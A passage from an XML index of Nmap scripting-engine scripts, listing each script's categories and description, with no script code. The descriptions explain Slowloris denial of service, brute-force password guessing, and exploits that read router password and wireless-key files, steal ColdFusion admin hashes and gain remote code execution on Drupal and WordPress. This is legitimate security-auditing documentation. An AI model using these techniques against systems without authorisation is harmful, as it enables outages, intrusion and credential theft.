<script filename="E:\Software\Nmap/scripts\http-slowloris.nse">
<categories><category>dos</category><category>intrusive</category></categories>
<description>Tests a web server for vulnerability to the Slowloris DoS attack by launching a Slowloris attack.&#xa;&#xa;Slowloris was described at Defcon 17 by RSnake&#xa;(see http://ha.ckers.org/slowloris/).&#xa;&#xa;This script opens and maintains numerous &apos;half-HTTP&apos; connections until&#xa;the server runs out of resources, leading to a denial of service. When&#xa;a successful DoS is detected, the script stops the attack and returns&#xa;these pieces of information (which may be useful to tweak further&#xa;filtering rules):&#xa;* Time taken until DoS&#xa;* Number of sockets used&#xa;* Number of queries sent&#xa;By default the script runs for 30 minutes if DoS is not achieved.&#xa;&#xa;Please note that the number of concurrent connexions must be defined&#xa;with the &lt;code&gt;-&#45;max-parallelism&lt;/code&gt; option (default is 20, suggested&#xa;is 400 or more) Also, be advised that in some cases this attack can&#xa;bring the web server down for good, not only while the attack is&#xa;running.&#xa;&#xa;Also, due to OS limitations, the script is unlikely to work&#xa;when run from Windows.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-sql-injection.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Spiders an HTTP server looking for URLs containing queries vulnerable to an SQL&#xa;injection attack. It also extracts forms from found websites and tries to identify&#xa;fields that are vulnerable.&#xa;&#xa;The script spiders an HTTP server looking for URLs containing queries. It then&#xa;proceeds to combine crafted SQL commands with susceptible URLs in order to&#xa;obtain errors. The errors are analysed to see if the URL is vulnerable to&#xa;attack. This uses the most basic form of SQL injection but anything more&#xa;complicated is better suited to a standalone tool.&#xa;&#xa;We may not have access to the target web server&apos;s true hostname, which can prevent access to&#xa;virtually hosted sites.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-stored-xss.nse">
<categories><category>intrusive</category><category>exploit</category><category>vuln</category></categories>
<description>Posts specially crafted strings to every form it&#xa;encounters and then searches through the website for those&#xa;strings to determine whether the payloads were successful.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-svn-enum.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Enumerates users of a Subversion repository by examining logs of most recent commits.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-svn-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Requests information from a Subversion repository.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-title.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Shows the title of the default page of a web server.&#xa;&#xa;The script will follow up to 5 HTTP redirects, using the default rules in the&#xa;http library.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-tplink-dir-traversal.nse">
<categories><category>vuln</category><category>exploit</category></categories>
<description>Exploits a directory traversal vulnerability existing in several TP-Link&#xa;wireless routers. Attackers may exploit this vulnerability to read any of the&#xa;configuration and password files remotely and without authentication.&#xa;&#xa;This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but&#xa;there are several models that use the same HTTP server so I believe they could&#xa;be vulnerable as well. I appreciate any help confirming the vulnerability in&#xa;other models.&#xa;&#xa;Advisory:&#xa;* http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740&#xa;&#xa;Other interesting files:&#xa;* /tmp/topology.cnf (Wireless configuration)&#xa;* /tmp/ath0.ap_bss (Wireless encryption key)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-trace.nse">
<categories><category>vuln</category><category>discovery</category><category>safe</category></categories>
<description>Sends an HTTP TRACE request and shows if the method TRACE is enabled. If debug&#xa;is enabled, it returns the header fields that were modified in the response.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-traceroute.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Exploits the Max-Forwards HTTP header to detect the presence of reverse proxies.&#xa;&#xa;The script works by sending HTTP requests with values of the Max-Forwards HTTP&#xa;header varying from 0 to 2 and checking for any anomalies in certain response&#xa;values such as the status code, Server, Content-Type and Content-Length HTTP&#xa;headers and body values such as the HTML title.&#xa;&#xa;Based on the work of:&#xa;* Nicolas Gregoire (nicolas.gregoire@agarri.fr)&#xa;* Julien Cayssol (tools@aqwz.com)&#xa;&#xa;For more information, see:&#xa;* http://www.agarri.fr/kom/archives/2011/11/12/traceroute-like_http_scanner/index.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-trane-info.nse">
<categories><category>discovery</category><category>version</category><category>safe</category></categories>
<description>Attempts to obtain information from Trane Tracer SC devices. Trane Tracer SC&#xa; is an intelligent field panel for communicating with HVAC equipment controllers&#xa; deployed across several sectors including commercial facilities and others.&#xa;&#xa;The information is obtained from the web server that exposes sensitive content to&#xa; unauthenticated users.&#xa;&#xa;Tested on Trane Tracer SC version 4.40.1211 and below.&#xa;&#xa;References:&#xa;* http://websec.mx/publicacion/blog/Scripts-de-Nmap-para-Trane-Tracer-SC-HVAC&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-unsafe-output-escaping.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Spiders a website and attempts to identify output escaping problems&#xa;where content is reflected back to the user.  This script locates all&#xa;parameters, ?x=foo&amp;y=bar and checks if the values are reflected on the&#xa;page. If they are indeed reflected, the script will try to insert&#xa;ghz&gt;hzx&quot;zxc&apos;xcv and check which (if any) characters were reflected&#xa;back onto the page without proper html escaping.  This is an&#xa;indication of potential XSS vulnerability.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-useragent-tester.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Checks if various crawling utilities are allowed by the host.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-userdir-enum.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Attempts to enumerate valid usernames on web servers running with the mod_userdir&#xa;module or similar enabled.&#xa;&#xa;The Apache mod_userdir module allows user-specific directories to be accessed&#xa;using the http://example.com/~user/ syntax.  This script makes http requests in&#xa;order to discover valid user-specific directories and infer valid usernames.  By&#xa;default, the script will use Nmap&apos;s&#xa;&lt;code&gt;nselib/data/usernames.lst&lt;/code&gt;.  An HTTP response&#xa;status of 200 or 403 means the username is likely a valid one and the username&#xa;will be output in the script results along with the status code (in parentheses).&#xa;&#xa;This script makes an attempt to avoid false positives by requesting a directory&#xa;which is unlikely to exist.  If the server responds with 200 or 403 then the&#xa;script will not continue testing it.&#xa;&#xa;CVE-2001-1013: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2001-1013.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vhosts.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Searches for web virtual hostnames by making a large number of HEAD requests against http servers using common hostnames.&#xa;&#xa;Each HEAD request provides a different&#xa;&lt;code&gt;Host&lt;/code&gt; header. The hostnames come from a built-in default&#xa;list. Shows the names that return a document. Also shows the location of&#xa;redirections.&#xa;&#xa;The domain can be given as the &lt;code&gt;http-vhosts.domain&lt;/code&gt; argument or&#xa;deduced from the target&apos;s name. For example when scanning www.example.com,&#xa;various names of the form &lt;name&gt;.example.com are tried.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-virustotal.nse">
<categories><category>safe</category><category>malware</category><category>external</category></categories>
<description>Checks whether a file has been determined as malware by Virustotal. Virustotal&#xa;is a service that provides the capability to scan a file or check a checksum&#xa;against a number of the major antivirus vendors. The script uses the public&#xa;API which requires a valid API key and has a limit on 4 queries per minute.&#xa;A key can be acquired by registering as a user on the virustotal web page:&#xa;* http://www.virustotal.com&#xa;&#xa;The scripts supports both sending a file to the server for analysis or&#xa;checking whether a checksum (supplied as an argument or calculated from a&#xa;local file) was previously discovered as malware.&#xa;&#xa;As uploaded files are queued for analysis, this mode simply returns a URL&#xa;where status of the queued file may be checked.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vlcstreamer-ls.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Connects to a VLC Streamer helper service and lists directory contents. The&#xa;VLC Streamer helper service is used by the iOS VLC Streamer application to&#xa;enable streaming of multimedia content from the remote server to the device.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vmware-path-vuln.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Checks for a path-traversal vulnerability in VMWare ESX, ESXi, and Server (CVE-2009-3733).&#xa;&#xa;The vulnerability was originally released by Justin Morehouse and Tony Flick, who presented at Shmoocon 2010 (http://fyrmassociates.com/tools.html).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2006-3392.nse">
<categories><category>exploit</category><category>vuln</category><category>intrusive</category></categories>
<description>Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)&#xa;&#xa;Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.&#xa;This allows arbitrary files to be read, without requiring authentication, using &quot;..%01&quot; sequences&#xa;to bypass the removal of &quot;../&quot; directory traversal sequences.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2009-3960.nse">
<categories><category>exploit</category><category>intrusive</category><category>vuln</category></categories>
<description>Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.&#xa;&#xa;This vulnerability permits to read local files remotely and is present in&#xa;BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data&#xa;Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and&#xa;ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0&#xa;&#xa;For more information see:&#xa;* http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf&#xa;* https://www.securityfocus.com/bid/38197&#xa;* Metasploit module: auxiliary/scanner/http/adobe_xml_inject&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2010-0738.nse">
<categories><category>safe</category><category>auth</category><category>vuln</category></categories>
<description>Tests whether a JBoss target is vulnerable to jmx console authentication bypass (CVE-2010-0738).&#xa;&#xa;It works by checking if the target paths require authentication or redirect to a login page that could be&#xa;bypassed via a HEAD request. RFC 2616 specifies that the HEAD request should be treated exactly like GET but&#xa;with no returned response body. The script also detects if the URL does not require authentication at all.&#xa;&#xa;For more information, see:&#xa;* CVE-2010-0738 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738&#xa;* http://www.imperva.com/resources/glossary/http_verb_tampering.html&#xa;* https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2010-2861.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Executes a directory traversal attack against a ColdFusion&#xa;server and tries to grab the password hash for the administrator user. It&#xa;then uses the salt value (hidden in the web page) to create the SHA1&#xa;HMAC hash that the web server needs for authentication as admin. You can&#xa;pass this value to the ColdFusion server as the admin without cracking&#xa;the password hash.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2011-3192.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects a denial of service vulnerability in the way the Apache web server&#xa;handles requests for multiple overlapping/simple ranges of a page.&#xa;&#xa;References:&#xa;* https://seclists.org/fulldisclosure/2011/Aug/175&#xa;* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192&#xa;* https://www.tenable.com/plugins/nessus/55976&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2011-3368.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Tests for the CVE-2011-3368 (Reverse Proxy Bypass) vulnerability in Apache HTTP server&apos;s reverse proxy mode.&#xa;The script will run 3 tests:&#xa;* the loopback test, with 3 payloads to handle different rewrite rules&#xa;* the internal hosts test. According to Contextis, we expect a delay before a server error.&#xa;* The external website test. This does not mean that you can reach a LAN ip, but this is a relevant issue anyway.&#xa;&#xa;References:&#xa;* http://www.contextis.com/research/blog/reverseproxybypass/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2012-1823.nse">
<categories><category>exploit</category><category>vuln</category><category>intrusive</category></categories>
<description>Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This&#xa;critical vulnerability allows attackers to retrieve source code and execute&#xa;code remotely.&#xa;&#xa;The script works by appending &quot;?-s&quot; to the uri to make vulnerable php-cgi&#xa;handlers return colour syntax highlighted source. We use the pattern &quot;&lt;span&#xa;style=.*&gt;&amp;lt;?&quot; to detect&#xa;vulnerable installations.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2013-0156.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Detects Ruby on Rails servers vulnerable to object injection, remote command&#xa;executions and denial of service attacks. (CVE-2013-0156)&#xa;&#xa;All Ruby on Rails versions before 2.3.15, 3.0.x before 3.0.19, 3.1.x before&#xa;3.1.10, and 3.2.x before 3.2.11 are vulnerable. This script sends 3 harmless&#xa;YAML payloads to detect vulnerable installations. If the malformed object&#xa;receives a status 500 response, the server is processing YAML objects and&#xa;therefore is likely vulnerable.&#xa;&#xa;References:&#xa;* https://community.rapid7.com/community/metasploit/blog/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156&apos;,&#xa;* https://groups.google.com/forum/?fromgroups=#!msg/rubyonrails-security/61bkgvnSGTQ/nehwjA8tQ8EJ&apos;,&#xa;* http://cvedetails.com/cve/2013-0156/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2013-6786.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Detects a URL redirection and reflected XSS vulnerability in Allegro RomPager&#xa;Web server. The vulnerability has been assigned CVE-2013-6786.&#xa;&#xa;The check is general enough (script tag injection via Referer header) that some&#xa;other software may be vulnerable in the same way.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2013-7091.nse">
<categories><category>exploit</category><category>vuln</category><category>intrusive</category></categories>
<description>An 0 day was released on the 6th December 2013 by rubina119, and was patched in Zimbra 7.2.6.&#xa;&#xa;The vulnerability is a local file inclusion that can retrieve any file from the server.&#xa;&#xa;Currently, we read /etc/passwd and /dev/null, and compare the lengths to determine vulnerability.&#xa;&#xa;TODO:&#xa;Add the possibility to read compressed file.&#xa;Then, send some payload to create the new mail account.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-2126.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA ASDM&#xa;Privilege Escalation Vulnerability (CVE-2014-2126).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-2127.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN&#xa;Privilege Escalation Vulnerability (CVE-2014-2127).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-2128.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN&#xa;Authentication Bypass Vulnerability (CVE-2014-2128).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-2129.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SIP&#xa;Denial of Service Vulnerability (CVE-2014-2129).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-3704.nse">
<categories><category>vuln</category><category>intrusive</category><category>exploit</category></categories>
<description>Exploits CVE-2014-3704 also known as &apos;Drupageddon&apos; in Drupal. Versions &lt; 7.32&#xa;of Drupal core are known to be affected.&#xa;&#xa;Vulnerability allows remote attackers to conduct SQL injection attacks via an&#xa;array containing crafted keys.&#xa;&#xa;The script injects new Drupal administrator user via login form and then it&#xa;attempts to log in as this user to determine if target is vulnerable. If that&apos;s&#xa;the case following exploitation steps are performed:&#xa;&#xa;* PHP filter module which allows embedded PHP code/snippets to be evaluated is enabled,&#xa;* permission to use PHP code for administrator users is set,&#xa;* new article which contains payload is created &amp; previewed,&#xa;* cleanup: by default all DB records that were added/modified by the script are restored.&#xa;&#xa;Vulnerability originally discovered by Stefan Horst from SektionEins.&#xa;&#xa;Exploitation technique used to achieve RCE on the target is based on exploit/multi/http/drupal_drupageddon Metasploit module.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2014-8877.nse">
<categories><category>vuln</category><category>intrusive</category><category>exploit</category></categories>
<description>Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM&#xa;Download Manager plugin. Versions &lt;= 2.0.0 are known to be affected.&#xa;&#xa;CM Download Manager plugin does not correctly sanitise the user input which&#xa;allows remote attackers to execute arbitrary PHP code via the CMDsearch&#xa;parameter to cmdownloads/, which is processed by the PHP &apos;create_function&apos;&#xa;function.&#xa;&#xa;The script injects PHP system() function into the vulnerable target in order to&#xa;execute specified shell command.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2015-1427.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>This script attempts to detect a vulnerability, CVE-2015-1427, which  allows attackers&#xa; to leverage features of this API to gain unauthenticated remote code execution (RCE).&#xa;&#xa; Elasticsearch versions 1.3.0-1.3.7 and 1.4.0-1.4.2 have a vulnerability in the Groovy scripting engine.&#xa; The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute shell&#xa; commands as the user running the Elasticsearch Java VM.&#xa; </description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2015-1635.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Checks for a remote code execution vulnerability (MS15-034) in Microsoft Windows systems (CVE2015-2015-1635).&#xa;&#xa;The script sends a specially crafted HTTP request with no impact on the system to detect this vulnerability.&#xa;The affected versions are Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1,&#xa;and Windows Server 2012 R2.&#xa;&#xa;References:&#xa;* https://technet.microsoft.com/library/security/MS15-034&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2017-1001000.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Attempts to detect a privilege escalation vulnerability in Wordpress 4.7.0 and 4.7.1 that&#xa;allows unauthenticated users to inject content in posts.&#xa;&#xa;The script connects to the Wordpress REST API to obtain the list of published posts and&#xa;grabs the user id and date from there. Then it attempts to update the date field in the&#xa;post with the same date information we just obtained. If the request doesn&#xe2;&#x80;&#x99;t return an&#xa;error, we mark the server as vulnerable.&#xa;&#xa;References:&#xa;https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html&#xa;&#xa;  </description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2017-5638.nse">
<categories><category>vuln</category></categories>
<description>Detects whether the specified URL is vulnerable to the Apache Struts&#xa;Remote Code Execution Vulnerability (CVE-2017-5638).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2017-5689.nse">
<categories><category>vuln</category><category>auth</category><category>exploit</category></categories>
<description>Detects if a system with Intel Active Management Technology is vulnerable to the INTEL-SA-00075&#xa;privilege escalation vulnerability (CVE2017-5689).&#xa;&#xa;This script determines if a target is vulnerable by attempting to perform digest authentication&#xa;with a blank response parameter. If the authentication succeeds, a HTTP 200 response is received.&#xa;&#xa;References:&#xa;* https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-cve2017-8917.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>An SQL Injection vulnerability affecting Joomla! 3.7.x before 3.7.1 allows for&#xa;unauthenticated users to execute arbitrary SQL commands. This vulnerability was&#xa;caused by a new component, &lt;code&gt;com_fields&lt;/code&gt;, which was introduced in&#xa;version 3.7. This component is publicly accessible, which means this can be&#xa;exploited by any malicious individual visiting the site.&#xa;&#xa;The script attempts to inject an SQL statement that runs the &lt;code&gt;user()&lt;/code&gt;&#xa;information function on the target website. A successful injection will return&#xa;the current MySQL user name and host name in the extra_info table.&#xa;&#xa;This script is based on a Python script written by brianwrf.&#xa;&#xa;References:&#xa;* https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html&#xa;* https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-misfortune-cookie.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Detects the RomPager 4.07 Misfortune Cookie vulnerability by safely exploiting it.</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-vuln-wnr1000-creds.nse">
<categories><category>exploit</category><category>vuln</category><category>intrusive</category></categories>
<description>A vulnerability has been discovered in WNR 1000 series that allows an attacker&#xa;to retrieve administrator credentials with the router interface.&#xa;Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA&#xa;&#xa;Vulnerability discovered by c1ph04.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-waf-detect.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to determine whether a web server is protected by an IPS (Intrusion&#xa;Prevention System), IDS (Intrusion Detection System) or WAF (Web Application&#xa;Firewall) by probing the web server with malicious payloads and detecting&#xa;changes in the response code and body.&#xa;&#xa;To do this the script will send a &quot;good&quot; request and record the response,&#xa;afterwards it will match this response against new requests containing&#xa;malicious payloads. In theory, web applications shouldn&apos;t react to malicious&#xa;requests because we are storing the payloads in a variable that is not used by&#xa;the script/file and only WAF/IDS/IPS should react to it.  If aggro mode is set,&#xa;the script will try all attack vectors (More noisy)&#xa;&#xa;This script can detect numerous IDS, IPS, and WAF products since they often&#xa;protect web applications in the same way.  But it won&apos;t detect products which&#xa;don&apos;t alter the http traffic.  Results can vary based on product configuration,&#xa;but this script has been tested to work against various configurations of the&#xa;following products:&#xa;&#xa;* Apache ModSecurity&#xa;* Barracuda Web Application Firewall&#xa;* PHPIDS&#xa;* dotDefender&#xa;* Imperva Web Firewall&#xa;* Blue Coat SG 400&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-waf-fingerprint.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Tries to detect the presence of a web application firewall and its type and&#xa;version.&#xa;&#xa;This works by sending a number of requests and looking in the responses for&#xa;known behavior and fingerprints such as Server header, cookies and headers&#xa;values. Intensive mode works by sending additional WAF specific requests to&#xa;detect certain behaviour.&#xa;&#xa;Credit to wafw00f and w3af for some fingerprints.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-webdav-scan.nse">
<categories><category>safe</category><category>discovery</category><category>default</category></categories>
<description>A script to detect WebDAV installations. Uses the OPTIONS and PROPFIND methods.&#xa;&#xa;The script sends an OPTIONS request which lists the dav type, server type, date&#xa;and allowed methods. It then sends a PROPFIND request and tries to fetch exposed&#xa;directories and internal ip addresses by doing pattern matching in the response body.&#xa;&#xa;This script takes inspiration from the various scripts listed here:&#xa;* http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html&#xa;* https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb&#xa;* http://code.google.com/p/davtest/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-wordpress-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>performs brute force password auditing against Wordpress CMS/blog installations.&#xa;&#xa;This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are&#xa;stored using the credentials library.&#xa;&#xa;Wordpress default uri and form names:&#xa;* Default uri:&lt;code&gt;wp-login.php&lt;/code&gt;&#xa;* Default uservar: &lt;code&gt;log&lt;/code&gt;&#xa;* Default passvar: &lt;code&gt;pwd&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-wordpress-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates themes and plugins of Wordpress installations. The script can also detect&#xa; outdated plugins by comparing version numbers with information pulled from api.wordpress.org.&#xa;&#xa;The script works with two separate databases for themes (wp-themes.lst) and plugins (wp-plugins.lst).&#xa;The databases are sorted by popularity and the script will search only the top 100 entries by default.&#xa;The theme database has around 32,000 entries while the plugin database has around 14,000 entries.&#xa;&#xa;The script determines the version number of a plugin by looking at the readme.txt file inside the plugin&#xa;directory and it uses the file style.css inside a theme directory to determine the theme version.&#xa;If the script argument check-latest is set to true, the script will query api.wordpress.org to obtain&#xa;the latest version number available. This check is disabled by default since it queries an external service.&#xa;&#xa;This script is a combination of http-wordpress-plugins.nse and http-wordpress-themes.nse originally&#xa;submited by Ange Gutek and Peter Hill.&#xa;&#xa;TODO:&#xa;-Implement version checking for themes.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-wordpress-users.nse">
<categories><category>auth</category><category>intrusive</category><category>vuln</category></categories>
<description>Enumerates usernames in Wordpress blog/CMS installations by exploiting an&#xa;information disclosure vulnerability existing in versions 2.6, 3.1, 3.1.1,&#xa;3.1.3 and 3.2-beta2 and possibly others.&#xa;&#xa;Original advisory:&#xa;* http://www.talsoft.com.ar/site/research/security-advisories/wordpress-user-id-and-user-name-disclosure/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-xssed.nse">
<categories><category>safe</category><category>external</category><category>discovery</category></categories>
<description>This script searches the xssed.com database and outputs the result.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\https-redirect.nse">
<categories><category>version</category></categories>
<description>Check for HTTP services that redirect to the HTTPS on the same port.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\iax2-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the Asterisk IAX2 protocol.&#xa;Guessing fails when a large number of attempts is made due to the maxcallnumber limit (default 2048).&#xa;In case your getting &quot;ERROR: Too many retries, aborted ...&quot; after a while, this is most likely what&apos;s happening.&#xa;In order to avoid this problem try:&#xa;  - reducing the size of your dictionary&#xa;  - use the brute delay option to introduce a delay between guesses&#xa;  - split the guessing up in chunks and wait for a while between them&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\iax2-version.nse">
<categories><category>version</category></categories>
<description>Detects the UDP IAX2 service.&#xa;&#xa;The script sends an Inter-Asterisk eXchange (IAX) Revision 2 Control Frame POKE&#xa;request and checks for a proper response.  This protocol is used to enable VoIP&#xa;connections between servers as well as client-server communication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\icap-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Tests a list of known ICAP service names and prints information about&#xa;any it detects. The Internet Content Adaptation Protocol (ICAP) is&#xa;used to extend transparent proxy servers and is generally used for&#xa;content filtering and antivirus scanning.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\iec-identify.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to identify IEC 60870-5-104 ICS protocol.&#xa;&#xa;After probing with a TESTFR (test frame) message, a STARTDT (start data&#xa;transfer) message is sent and general interrogation is used to gather the list&#xa;of information object addresses stored.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ike-version.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Obtains information (such as vendor and device type where available) from an&#xa;IKE service by sending four packets to the host.  This scripts tests with both&#xa;Main and Aggressive Mode and sends multiple transforms per request.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\imap-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\imap-capabilities.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Retrieves IMAP email server capabilities.&#xa;&#xa;IMAP4rev1 capabilities are defined in RFC 3501. The CAPABILITY command&#xa;allows a client to ask a server what commands it supports and possibly&#xa;any site-specific policy.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\imap-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote IMAP services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending an IMAP NTLM authentication request with null credentials will&#xa;cause the remote service to respond with a NTLMSSP message disclosing&#xa;information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\impress-remote-discover.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Tests for the presence of the LibreOffice Impress Remote server.&#xa;Checks if a PIN is valid if provided and will bruteforce the PIN&#xa;if requested.&#xa;&#xa;When a remote first contacts Impress and sends a client name and PIN, the user&#xa;must open the &quot;Slide Show -&gt; Impress Remote&quot; menu and enter the matching PIN at&#xa;the prompt, which shows the client name. Subsequent connections with the same&#xa;client name may then use the same PIN without user interaction.  If no PIN has&#xa;been set for the session, each PIN attempt will result in a new prompt in the&#xa;&quot;Impress Remote&quot; menu. Brute-forcing the PIN, therefore, requires that the user&#xa;has entered a PIN for the same client name, and will result in lots of extra&#xa;prompts in the &quot;Impress Remote&quot; menu.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\informix-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against IBM Informix Dynamic Server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\informix-query.nse">
<categories><category>intrusive</category><category>auth</category></categories>
